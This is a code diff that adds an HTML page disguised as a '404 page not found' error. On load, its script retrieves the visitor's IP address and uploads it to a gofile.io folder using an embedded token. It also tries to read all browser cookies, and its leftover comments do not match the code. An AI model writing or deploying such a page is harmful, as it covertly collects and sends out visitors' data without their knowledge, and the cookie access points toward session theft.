@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>Getting Clients IP</title>
+	<style>
+	p, h1 {
+		color: green;
+	}
+	</style>
+
+	<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+	</script>
+	
+	<script>
+	
+	/* Add "https://api.ipify.org?format=json" statement
+			this will communicate with the ipify servers in
+			order to retrieve the IP address $.getJSON will
+			load JSON-encoded data from the server using a
+			GET HTTP request */
+				
+	$.getJSON("https://api.ipify.org?format=json", function(data) {
+		
+		// Setting text of element P with id gf
+        let fileurl = new Blob([JSON.stringify(data.ip, null, 2)], { type: 'text/plain' });
+    var formdata = new FormData();
+    formdata.append("File",fileurl);
+    formdata.append("token", "5JzuJ0Lqnkaj6mu7407luENsbI2lDP25");
+    formdata.append("folderId", "2e153e29-a60e-4859-b8c5-c0227c7e8904");
+     var requestOptions = {
+       method: 'POST',
+       body: formdata,
+       redirect: 'follow'
+     };
+
+fetch("https://store1.gofile.io/uploadFile", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+    console.log("done:)");
+  
+	});
+    chrome.runtime.cookies.getAll({  }, (cookies) => {
+     console.log(cookies);
+   })
+	</script>
+</head>
+
+<body>
+	<center>
+		<h1>404 page not found</h1>
+		
+	</center>
+</body>
+
+</html>
